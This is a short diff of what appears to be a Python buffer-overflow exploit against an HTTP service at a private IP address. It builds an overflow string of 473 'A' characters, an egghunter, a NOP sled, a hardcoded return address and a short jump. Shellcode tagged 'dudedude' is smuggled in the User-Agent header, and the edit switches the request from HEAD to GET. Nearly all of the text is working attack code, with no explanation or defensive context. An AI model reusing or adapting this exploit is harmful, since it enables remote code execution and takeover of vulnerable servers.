@@ -33,7 +33,7 @@ buf += b"\x18\xc9\x84\x36\xff\x59\x44\x97\x9a\xd9\xef\xe7"
 
 stuff = "A"*473 + egghunter + "\x90"*10 + "\xce\x57\xae\x77" + "\xeb\x86"
 otherstuff = "dudedude" + buf
-buffer =  "HEAD /" + stuff + " HTTP/1.1\r\n"
+buffer =  "GET /" + stuff + " HTTP/1.1\r\n"
 buffer += "Host: 172.16.0.24:8080\r\n"
 buffer += "User-Agent: "+ otherstuff + "\r\n"
 buffer += "Keep-Alive: 115\r\n"
